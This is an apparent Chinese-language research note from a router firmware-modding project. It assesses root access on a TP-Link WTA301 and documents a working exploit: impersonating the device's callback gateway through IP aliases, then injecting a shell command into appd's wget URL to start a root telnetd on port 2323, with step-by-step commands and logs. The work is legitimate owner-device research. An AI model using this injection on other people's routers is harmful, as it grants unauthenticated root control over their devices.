# 普通用户能不能刷 u-boot —— getroot 链评估

date: 2026-11-06（初版）· 2026-11-07（**§2 已重写：路由模式/有线/scapy 三个前提全部推翻**）
起因：用户切回原厂系统后问「getroot 怎么获取 root，这决定了普通用户刷新 uboot」。

**结论：getroot 能让 _技术用户_ 免 TTL 拿 root，但**不能**成为普通用户刷 u-boot 的路径。
普通用户第一次刷 u-boot，目前只有 TTL 一条路。

> ⚠️ 2026-11-07 更正：初版 §2 断言「路由模式下这条路不成立」是**错的**。
> 实测在**路由模式 192.168.1.175 + 有线以太网 + 完全不用 scapy** 的条件下成功拿到 `uid=0`。
> 错因：把「必须 ARP 毒化 192.168.0.1」当成了硬前提，而实际只要该地址**本身无人占用**，
> 加一个 IP 别名就成了真网关，无需毒化任何人。详见 §2。

证据分档：`[本板实证]` 本机镜像/脚本 · `[外部实证]` 可复核的外部原文 ·
`[文档实证]` 本仓库既有文档已结论化的内容 · `[推断]` 有推理链未实测。

---

## 1. getroot 怎么拿 root（文档已有完整复现链）

出处 `work/docs/02-ROOT-获取.md` + `work/docs/archive-md/ROOT-SHELL-复现手册.md`。
脚本在 `work/net/`（`getroot.py` `poison.py` `elink_gw4.py` `srv.py`），
备份工具在 `work/_archive/scripts/`（`listener.py` `tsh.py` `check_env.py` 等，均已核实存在）。

### 1.1 两条路

**路 A（推荐，零副作用）** —— 网关地址本身无人占用时，**不用毒化**：

```powershell
New-NetIPAddress -InterfaceIndex <idx> -IPAddress 192.168.1.1 -PrefixLength 32 -SkipAsSource $true
New-NetIPAddress -InterfaceIndex <idx> -IPAddress 192.168.0.1 -PrefixLength 32 -SkipAsSource $true
netsh advfirewall firewall add rule name=WTA_ELINK dir=in action=allow protocol=TCP localport=32768
netsh advfirewall firewall add rule name=WTA_SRV   dir=in action=allow protocol=TCP localport=8099
```
然后起 `srv.py` + `elink_gw4.py`，等 4 分钟。完整四步见 §2.3。

**路 B（旧方案，需 ARP 毒化）** —— 网关地址被真实主机占用时：

```bash
python getroot.py        # 自动找 IP/MAC + 配伪装地址 + 起三件套 + 验证 uid=0
```

两条路成功后一样：`telnet <IP> 2323` 直接是 `uid=0(root)`，无用户名密码。

### 1.2 原理链（六环，每环有原文出处）

`[文档实证]`：

1. 设备上 `elinkclt` 周期性（约 4 分钟，失败 3 次退避）**主动反连「网关」**
   `192.168.0.1:32768` 与 `192.168.1.1:32768` 交替（§1.4）
2. 让这些报文落到 PC 上：
   - 原文是「用 **ARP 毒化**把设备眼里的 `192.168.0.1` 抢到 PC 身上」（`poison.py`）
   - **2026-11-07 实测补充**：若该地址**本身无人占用**，只需给 PC 加该地址的 `/32` 别名，
     效果等同且零副作用（详见 §2）
3. 握手：DH 128 位 + AES-128-CBC（IV 固定 0），帧格式
   `[BE u32 magic 0x3f721fb5][len][payload]`；**`data` 必须是数组、`message` 必须是对象**
4. 连上后发 `ubus_call ctcapd.appd install '{"url":"..."}'` → appd 走 `_download_app@0x15180`
5. appd 用 `asprintf`（`0x1530c/0x15334`）拼 `wget <url>` 再 `popen@0x151b4`，
   **URL 未过滤 `;`** ⇒ 命令注入
6. payload：`http://<PC_IP>:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 ...)`

注入点落在 `appd` 里，而 appd 以 root 跑 ⇒ 拿到的就是 root。

### 1.3 前置条件（2026-11-07 实测修正版）

| 条件 | 旧文档说法 | **实测结论** |
|---|---|---|
| 设备工作模式 | 必须 repeater（中继） | ❌ **路由模式也行** |
| 设备地址 | 必须在 `192.168.0.x` | ❌ `.1.175` / `.0.x` 都行 |
| PC 连接方式 | 必须连设备自己的 WiFi | ❌ **有线 LAN1 也行** |
| 网卡别名 | 加 `192.168.0.1/32` | ✅ **要加，且 `192.168.1.1/32` 也要加** |
| ARP 毒化 / scapy | 「必须」 | ❌ **完全不需要**（见 §2.3） |
| Npcap | 「必须」 | ❌ 不需要 |
| Python | 3.12 + pypcap | ✅ 3.12 + `cryptography` 即可 |
| 真实硬前提 | —— | **设备网关地址那台主机不在线**（收到包的人必须是我们） |

唯一硬前提重述：`elinkclt` 回连的目标必须真的落到 PC 上。要么那台主机不在线（加别名即可），
要么在线但被毒化。**前者零副作用，永远优先试前者。**

### 1.4 `elinkclt` 连哪两个地址

`[文档实证]` 手册 §4.4 原文：
> 2. SSDP 失败后**直接连硬编码的网关 IP**：`192.168.0.1:32768` 和 `192.168.1.1:32768` 交替

---

## 2. ★ 实测成功：路由模式 + 有线 + 零 scapy（2026-11-07）

### 2.1 初版错在哪（自纠记录）

初版断言「路由模式下不成立」，理由是「`elinkclt` 连 `192.168.1.1:32768` 但那是它自己」。

**这条推理漏了一种情况**：设备 `br-lan` 持 `.1` 时确实连自己；但本次实测设备是
**DHCP 客户端，地址 `192.168.1.175`**，`.1` 那台主机**不存在**（ARP 表里只有 `.175` 和广播）。
此时 PC 加 `.1` 别名就合法地成了它的网关，报文自然到 PC。

⇒ 判据不是「设备在什么模式」，而是「**设备要回连的那个地址，有没有别人占着**」。

### 2.2 实测环境（`[本板实证]`）

```
设备:   192.168.1.175  br-lan 98:97:CC:A8:1F:E7  (DHCP 获得)
        原厂 4.4.60 #1 SMP PREEMPT Thu Nov 28 01:14:03 CST 2024 armv7l
笔记本: 192.168.1.100  以太网 (InterfaceIndex 10, Realtek PCIe FE, 100Mbps) + 管理员权限
        .1 与 .0.1 均无人占用（arp -a 实测只有 .175 与 .255）
注入前端口: 80 OPEN / 443 OPEN / 2323 closed / 32768 closed
```

### 2.3 最小复现（四步，**没有 scapy、没有毒化、没有 Npcap**）

**第 1 步：加两个 IP 别名（管理员）**

```powershell
New-NetIPAddress -InterfaceIndex 10 -IPAddress 192.168.1.1 -PrefixLength 32 -SkipAsSource $true
New-NetIPAddress -InterfaceIndex 10 -IPAddress 192.168.0.1 -PrefixLength 32 -SkipAsSource $true
```

- 两个都要加：`elinkclt` 在 `192.168.0.1:32768` 与 `192.168.1.1:32768` 间交替。
- `SkipAsSource=$true` 是关键，否则 Windows 会用它做源地址、可能抢默认路由。
- 加完必须复测互联网仍在（实测 `Test-NetConnection 223.5.5.5:443` → `True`）。

**第 2 步：放行入站端口**

```powershell
netsh advfirewall firewall add rule name=WTA_ELINK dir=in action=allow protocol=TCP localport=32768
netsh advfirewall firewall add rule name=WTA_SRV   dir=in action=allow protocol=TCP localport=8099
```

**第 3 步：起 HTTP 服务 + e-Link 网关模拟器（纯 stdlib + `cryptography`）**

```python
PAYLOAD = 'http://192.168.1.100:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);'
# 起 srv.py --root <含文件 x 的目录> --port 8099
# 起 elink_gw4.py <寿命秒> ctcapd.appd install '{"url":"<PAYLOAD>"}'
```

> ⚠️ **2026-11-07 二次更正（推翻了本文档上一版的说法）**
>
> 上一版写「必须用 `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP` 启动」，
> **这是错的**。Windows OpenSSH 在会话结束时会把该会话派生的**整个进程树**杀掉
> （sshd 把它们放进 job object），`DETACHED_PROCESS` 也逃不掉。
>
> 症状：`elink_gw4.log` 里只有一行 `### listen 32768 for 900s`，
> 然后永远没有 `accept`。而我的 SSH 命令早就返回了，
> 所以每次都是「监听已死 + 设备来了没人接」。
>
> **正确做法：把 srv + elink + 「轮询 2323」放进同一个进程、同一条 SSH 会话。**
> 父进程活着 = SSH 活着 = 子进程活着。
> 参考实现：`work/net/run_all.py`（本轮实测 9 秒命中）。

**第 4 步：等它自己回连**

```python
socket.create_connection(('192.168.1.175', 2323)).recv()   # 出现 BusyBox banner 即成功
```

> **回连间隔实测：快到「秒级」量级，不是「约 4 分钟一轮」。**
>
> 本轮修正了一个统计假象：`elink_gw4.log` 里两次 `accept` 相隔 35 分 39 秒
> （`00:47:46` → `01:23:25`），我因此一度推断周期是 36 分钟 —— **错**。
> 真实原因是那期间监听根本没活过（见第 3 步的 job object 问题），
> 设备想连也连不上。
>
> 一旦监听真正活着，实测 **9 秒**就命中（`run_all.py`）。
> ⇒ 不要按「要等半小时」去设计，按「监听必须在窗口期活着」去设计。

### 2.4 成功证据（`[本板实证]` 原文）

`elink_gw4.log`：
```
>>> ubus_call ctcapd.appd.install {"url": "http://192.168.1.100:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);"}
<<< {"type":"ubus_result","sequence":3,"mac":"9897CCA81FE7","errcode":0,"errmsg":"","data":[{"object":"ctcapd.appd","method":"install","message":{"result":-1,"failreason":"download failed: file not found"}}]}
```

`srv.err`：
```
REQ /x from ('192.168.1.175', 55654)
```

**⇒ `;` 命令分割确实生效**（appd 只请求了 `/x`，没请求 `/x;(...)` 那一长串）。
`result:-1 "download failed: file not found"` 是**假失败**：

> 服务器确实收到了 `/x` 并返回 200，注入的 `telnetd` 也确实起来了。
> appd 报错是因为它在 `popen` 之后还要校验下载产物。
> **判据是 2323 有没有起来，不是 appd 的返回码。**

2323 连上后：
```
BusyBox v1.19.4 (2024-11-28 00:57:41 CST) built-in shell (ash)
(unreachable)/ # id
uid=0(root) gid=0(root)
```

### 2.5 拿到 root 后能确认的环境

```
$ uname -a
Linux (none) 4.4.60 #1 SMP PREEMPT Thu Nov 28 01:14:03 CST 2024 armv7l GNU/Linux

$ ls /
bin  conf  ctcap  data  dev  etc  ini  ipks  lib  mnt  overlay  proc
rom  root  sbin  sys  tmp  usr  var  web  www

$ ifconfig
br-lan  inet addr:192.168.1.175  HWaddr 98:97:CC:A8:1F:E7
lo      inet addr:127.0.0.1
```

`ctcap` / `ini` / `ipks` / `web` / `www` 是 TP-Link 原厂目录，可确认不是 OpenWrt。

### 2.6 ⚠️ 必须知道的两个限制

**限制一：`/proc` 全不全、`/etc` 能不能持久写，取决于 `rootfs_data` 那 22 MB。**

同一个原厂固件、同一块板，本轮见过两种完全不同的状态（都是原厂 4.4.60）：

| | 状态 A（`/proc` 缺失） | 状态 B（`/proc` 完整） |
|---|---|---|
| `cat /proc/mtd` | `No such file or directory` | 15 个分区全列出 |
| `/dev/mtdblock*` | 不存在 | `mtdblock0..16` 齐全 |
| `mount` | `no /proc/mounts` | 7 条挂载正常 |
| `ls /dev` | 只有 `console` 一个 | 完整 |
| overlay | 没挂上 | `overlayfs on /etc` |
| root 能否改配置 | 不能 | 能（但见限制二） |

差别就在于 **`/dev/mtdblock7` 能否挂到 `/rom/overlay`**。

**限制二：就算 `/proc` 全了，`/etc` 的写层仍在 tmpfs（RAM），重启即丢。**

```
overlayfs:/tmp/overlay/root on /etc type overlay (rw, upperdir=/tmp/overlay/root, ...)
df: overlayfs 16.4M  已用 520K
```

`upperdir` 在 `/tmp` = tmpfs。原因：`mtd7`（`rootfs_data` 22 MB）上的 UBI 卷名是 **`"0"`**，
不是原厂 init 期望的 `rootfs_data`，所以原厂没能把它挂成 `/overlay`
（`cat /sys/class/ubi/ubi0_0/name` → `0`）。

> **这不是我们弄坏的。** `boot_cart2.log`（我们动手**之前**的原厂首次启动）里同样是
> `UBIFS error: too few LEBs (2), min. is 17` + `jffs2 not ready yet; using ramdisk`。
> 这台机器的可写分区在我们碰它之前就已经不可用了。

**怎么从 A 恢复到 B（本轮实测有效）**：擦掉 `0x6a00000` 那 22 MB，让原厂重建。
过程和证据见 `TP-SLOT-HEADER-VERIFIED.md` §7。

**别名用完要清**（不影响上网，但会污染该网段 ARP 语义）：
```powershell
Remove-NetIPAddress -IPAddress 192.168.1.1 -PrefixLength 32 -Confirm:$false
Remove-NetIPAddress -IPAddress 192.168.0.1 -PrefixLength 32 -Confirm:$false
netsh advfirewall firewall delete rule name=WTA_ELINK
netsh advfirewall firewall delete rule name=WTA_SRV
```

### 2.7 对「普通用户能不能用」的结论不变

步骤 1 要管理员权限、步骤 3 要跑 Python、还要保证监听跨会话存活。
**这是技术用户的路径，不是普通用户路径。** 可行性矩阵见 §4。

---

## 3. 原厂固件里的其它提权路径（全部走不通）

### 3.1 开 telnet：能开，但拿不到 root

`[本板实证]` 解包 `work/stock/rootfs202`：

`etc/init.d/telnet` 是**标准 OpenWrt 脚本**（`Copyright (C) 2006-2011 OpenWrt.org`），
逻辑是「没有 ssh 公钥且 root 无密码 ⇒ 起 telnetd」。

真正决定账号的是 `bin/telnet_check.sh`（`/etc/rc.d/S99telnet_check` 启动）：

```sh
TELNET_FILE="/tmp/etc/config/custom_system.json"
# 等 dms 写出这个文件
user=$(... user_name ...)
telnet_enable_switch=$(... enable ...)
encrypt_passwd=$(... crypt_passwd ...)
sed -i "${line_num}d" $PWD_FILE                      # 删旧的 :503:503: 行
echo "$user:$encrypt_passwd:503:503:$user:/home:/bin/ash" >> $PWD_FILE
/etc/init.d/telnet start
```

⇒ **账号 UID=503，不是 0。** 且 `[外部实证]` 恩山实测原文：
> 照着我给的文档打开telnet连上后，进入的是tp自己写的一个shell，psh，权限非常低，
> 不能路径补全，连元字符都不支持，唯一有用的是一个加密的goash命令，
> 要把它给出的字符串用TP的私钥进行加密，再BASE64编码，才能进入完整的SHELL。

`[本板实证]` 印证：`sbin/psh`（84244 B）内含 `goashcmd` / `rsa_verify` 符号。

`[本板实证]` **原厂 rootfs 里没有任何 SUID 二进制**：
```
$ find . -perm -4000 -type f
（空）
```
⇒ 从 uid 503 提到 root 没有现成跳板。

`[本板实证]` root 密码存在但不可用（非空即脚本不启 telnetd）：
```
etc/passwd: root:$1$3FHymwGr$mCqCCUAOcmiefgcrgrvMZ.:0:0:root:/root:/bin/ash
etc/shadow: root:x:0:0:99999:7:::
```
`etc/rc.d/` 里**没有** `dropbear`/`sshd`，也没有 dropbear 二进制。

### 3.2 原厂 u-boot 网页恢复：存在，但拒收我们的固件

`[本板实证]` `mtd0_factory_boot.bin`（0x3c0000）里含**完整 Web 恢复界面**，
型号串 `Init("WTA301", "1.1",120000)`，关键字符串（两份，偏移差正好 0x80000）：

```
0x2f38b9 / 0x3738b9  Firmware check failed! Enter recovery mode.
0x2f6c24 / 0x376c24  httpd	- start www server for firmware recovery
0x2fce94 / 0x37ce94  firmware check finished, ok to upgrade
0x2fd02b / 0x37d02b  Web failsafe mode aborted!
```

`[文档实证]` `work/docs/final/12-原厂固件反汇编结论汇编.md` §2 已给结论：
> - 触发：**双镜像验签全失败自动进入**（`0x4a927ab0` 返回 <0 → "Firmware check failed! Enter recovery mode." @`0x4a9708b8` → `run_command("httpd")`）
> - 服务：u-boot IP=`192.168.1.1`，PC 需接 LAN 口；120 秒无上传则 "Web failsafe mode aborted!"
> - 上传：POST /，表单上传 .bin；**要求 TP 私有头 + RSA 签名 + HwID 匹配**
>   （"firmware support my HwID" @`0x4a979e06`）
> - 上传后：`SerialFirmware` 系列函数写 flash
> - **无串口救援的唯一路径**（tftpboot 等需串口命令行）

⇒ **RSA 签名这一关过不去**，我们自编的 u-boot / 固件传不上去。
而触发它还需要先让两个镜像都验签失败 —— 那本身就要写 flash。

### 3.3 原厂二级 u-boot：无网页、无 telnet、bootdelay 是 0

`[本板实证]` `strings mtd4_normal_boot.uboot.bin`，命令集只有：

```
nand(73) bootipq(4) tftpput(2) tftpboot(1) tftp(1)
```

**没有** `httpd`、`tplflash`、`telnetd`、`wget`，也没有任何 `failsafe`/`web` 痕迹。
且 `bootdelay=0`、`bootcmd=bootipq` ⇒ 不给打断窗口。

`[文档实证]` `work/docs/04-U-BOOT-引导链逆向.md` §1：
> 一级 u-boot … "input <abort key> to stop autoboot in 500 ms" ← **人手按不到**

---

## 4. 结论：普通用户刷 u-boot 的可行性矩阵

| 用户当前状态 | 能否刷 u-boot | 途径 |
|---|---|---|
| **原厂固件** | ❌ 不能（无 TTL） | 网页恢复要 RSA 签名；telnet 只给 uid 503 + psh；无 SUID |
| 原厂固件 + **任意拓扑 + 有线或无线 + 会跑 Python** | ✅ **能**（实测） | IP 别名冒充网关 → `getroot.py` 拿 root → 系统内写 flash（§2） |
| 原厂固件 + 不会用电脑 | ❌ 不能 | 仍只有 TTL |
| **已在我们 OpenWrt 上** | ✅ 能 | 本来就是 root，`mtd write` + 重算 TP 头 `+0x90` |
| 有 TTL 串口 | ✅ 能 | `tpluboot ... write`（P18 §7，一次性） |

**⇒ 对开源发布的口径**：首次刷机 = **必须 TTL**（拆机接线）。
P18 §7 原话「**这是最后一次需要 TTL 的刷写**」的前提，是「已经装上我们的 kit」。
对全新用户不成立。

> 2026-11-07 补充：getroot 门槛比初版估计**低很多**（不需要中继模式、不需要 scapy/Npcap、
> 不需要连设备 WiFi），但**仍然不适合写进「普通用户开箱即用」流程**：
> 需要管理员权限、需要本机跑 Python、有 4 分钟窗口期、杀软可能拦入站规则。
> 适合写进「进阶用户免 TTL 刷机」附录，并附失败回退（TTL）。

`[文档实证]` `src/README-WTA301.md` §10 安全红线也确认了救援面：
> **无 usb/ums/sd 命令 ⇒ 硬件救援只有串口。**

---

## 5. 要把普通用户的门槛降下来，只有三条路（都未做）

| 路 | 内容 | 风险/成本 |
|---|---|---|
| A | 把 getroot 做成一键包（**已不需要 Npcap / 中继**，只剩“加别名+跑两进程+等 4 分钟”） | 仍需管理员权限 + Python + 杀软可能拦入站规则 |
| B | 找原厂 dms 的未授权接口（绕过 RSA） | 未验证；可能有 CVE，但属攻击面研究 |
| C | 接受「首次必须 TTL」，写清前置条件 | 诚实、成本最低；但用户流失 |

本文档不推荐 B 作为默认路径，也不声称它可做 —— 未实测。
A 已被 §2 证实可行，剩下的是打包工作量。

---

## 6. 未验证项（不许当结论用）

| 项 | 状态 |
|---|---|
| ~~当前 192.168.1.1 路由模式下 getroot 实际跑一遍~~ | ✅ **已于 2026-11-07 实测成功**，见 §2 |
| dms `/custom_system/telnet/telnet` 调用后能否改 UID | ⬜ 未做，仅知脚本硬编码 503 |
| 原厂 Web 恢复的 RSA 校验是否可绕过（如降级到老固件） | ⬜ 未做 |
| 一级 u-boot 两份镜像（偏移差 0x80000）的 A/B 语义 | ✅ **已实测**，见 `TP-SLOT-HEADER-VERIFIED.md` |
| 原厂 Web 登录返回 `error_code -40211`（正确密码也报） | ⬜ 未解。`[外部实证]` Tapo 系列同码=鉴权失败；本板正确/错误密码结果相同，怀疑是本轮 RAM 实例 overlay 挂载失败所致 |
| getroot 能否在本轮这种“无 overlay”实例上改 flash | ⬜ 未做。`/dev/null` 只读、`/proc` 不完整，`mtd`/`dd` 大概率不可用 |
